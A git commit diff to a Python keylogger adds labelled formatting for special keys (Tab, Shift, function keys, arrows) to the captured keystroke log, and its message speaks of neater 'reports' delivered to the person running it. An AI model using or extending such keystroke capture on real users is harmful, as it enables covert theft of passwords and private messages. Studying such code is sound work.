996bbee0b0a3cc7093328b4c4bbc51f9df4904cd
Kevin Cochrane <kevin.cochrane@gmail.com>
2022-09-02 18:55:43 +0200

    Cleaned up keystroke reports in the process_key_press. Looks much neater now when you get your report.

--- keylogger.py
+++ keylogger.py
@@ -23,6 +23,56 @@ class Keylogger:
         except AttributeError:
             if key == key.space:
                 current_key = " "
+            elif key == key.tab:
+                current_key = " |TAB| "
+            elif key == key.shift:
+                current_key = " |SHIFT| "
+            elif key == key.backspace:
+                current_key = " |<--| "
+            elif key == key.alt:
+                current_key = " |ALT| "
+            elif key == key.f1:
+                current_key = " |F1| "
+            elif key == key.f2:
+                current_key = " |F2| "
+            elif key == key.f3:
+                current_key = " |F3| "
+            elif key == key.f4:
+                current_key = " |F4| "
+            elif key == key.f5:
+                current_key = " |F5| "
+            elif key == key.f6:
+                current_key = " |F6| "
+            elif key == key.f7:
+                current_key = " |F7| "
+            elif key == key.f8:
+                current_key = " |F8| "
+            elif key == key.f9:
+                current_key = " |F9| "
+            elif key == key.f10:
+                current_key = " |F10| "
+            elif key == key.f11:
+                current_key = " |F11| "
+            elif key == key.f12:
+                current_key = " |F12| "
+            elif key == key.enter:
+                current_key = " |ENTER| "
+            elif key == key.cmd:
+                current_key = " |COMMAND| "
+            elif key == key.menu:
+                current_key = " |MENU| "
+            elif key == key.num_lock:
+                current_key = " |NUM LOCK| "
+            elif key == key.delete:
+                current_key = " |DELETE| "
+            elif key == key.up:
+                current_key = " |^UP| "
+            elif key == key.down:
+                current_key = " |vDOWN| "
+            elif key == key.left:
+                current_key = " |<LEFT| "
+            elif key == key.right:
+                current_key = " |RIGHT>| "
             else:
                 current_key = " " + str(key) + " "
         self.append_to_log(current_key)
